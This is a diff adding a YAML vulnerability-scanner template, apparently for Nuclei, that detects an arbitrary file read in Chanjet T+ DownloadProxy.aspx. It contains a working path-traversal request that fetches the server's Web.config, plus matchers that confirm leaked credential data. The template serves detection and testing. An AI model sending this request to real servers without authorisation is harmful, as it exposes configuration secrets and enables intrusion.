@@ -1,0 +1,30 @@
+id: chanjet-tplus-downloadproxy-file-read
+info:
+  name: Chanjet T+ DownloadProxy.aspx Arbitrary File Read
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    Chanjet T+ DownloadProxy.aspx has arbitrary file reading vulnerabilities, and attackers can read sensitive information such as web.config to further control server permissions.
+  tags: file-read
+  reference:
+    - https://www.chanjet.com/
+
+http:
+  - raw:
+      - |
+        GET /tplus/SM/DTS/DownloadProxy.aspx?preload=1&Path=../../Web.Config HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "demoPwd_Base64"
+      - type: word
+        part: header
+        words:
+          - "Web.Config"
